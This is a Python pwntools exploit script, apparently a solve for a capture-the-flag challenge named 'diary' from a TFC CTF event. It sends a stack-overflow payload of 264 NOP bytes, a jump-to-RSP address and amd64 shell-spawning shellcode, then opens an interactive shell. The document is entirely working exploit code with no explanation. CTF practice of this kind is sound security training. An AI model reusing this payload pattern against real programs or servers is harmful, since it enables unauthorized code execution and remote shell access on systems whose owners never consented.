#!/usr/bin/env python3

from pwn import *

elf = ELF("./diary")
libc = elf.libc

context.binary = elf

gdbscript='''
break *0x00000000004012aa
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

def main():
    r = conn()
    #r = remote('challs.tfcctf.com',32484)
    shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')   
    #print(f"len of shell: {len(shellcode)}") 

    jmp_rsp = elf.sym.helper+4 

    payload = flat (
        asm('nop')*264,
        jmp_rsp,
        shellcode,
        )

    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()

